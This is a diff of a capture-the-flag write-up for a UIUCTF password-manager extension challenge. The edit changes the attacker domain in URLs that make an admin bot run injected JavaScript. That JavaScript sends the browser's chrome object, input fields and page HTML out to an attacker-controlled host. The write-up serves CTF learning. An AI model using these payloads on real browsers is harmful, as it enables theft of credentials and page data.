@@ -20,12 +20,12 @@ The bot does the following things
 - Fill up username password and submits
 - Goto my URL
 
-Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=track({chrome:chrome})`
+Sending it to `https://attack.yun.ng/attack/uiuctf?extra=track({chrome:chrome})`
 
 ### Chrome
 Turns out chrome is accessible.
 
-Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=track({a:analyze(chrome)})&no`
+Sending it to `https://attack.yun.ng/attack/uiuctf?extra=track({a:analyze(chrome)})&no`
 
 ```json
 {
@@ -71,11 +71,11 @@ Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=track({a:analyze(
 
 Nothing interesting... Maybe add some delay?
 
-Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=setTimeout(()=>{track({a:genTree(document),b:allInputs()})},5000)&no`
+Sending it to `https://attack.yun.ng/attack/uiuctf?extra=setTimeout(()=>{track({a:genTree(document),b:allInputs()})},5000)&no`
 
 Theres a DIV element added.
 
-Send `https://attack.octo-kumo.me/attack/uiuctf?extra=setTimeout(()=>{track({a:document.body.innerHTML})},5000)&no`
+Send `https://attack.yun.ng/attack/uiuctf?extra=setTimeout(()=>{track({a:document.body.innerHTML})},5000)&no`
 
 ```html
 <div class="pwnypass-autofill-host" style="position: fixed !important; z-index: 9999 !important; inset: 0px !important; pointer-events: none !important;"></div>
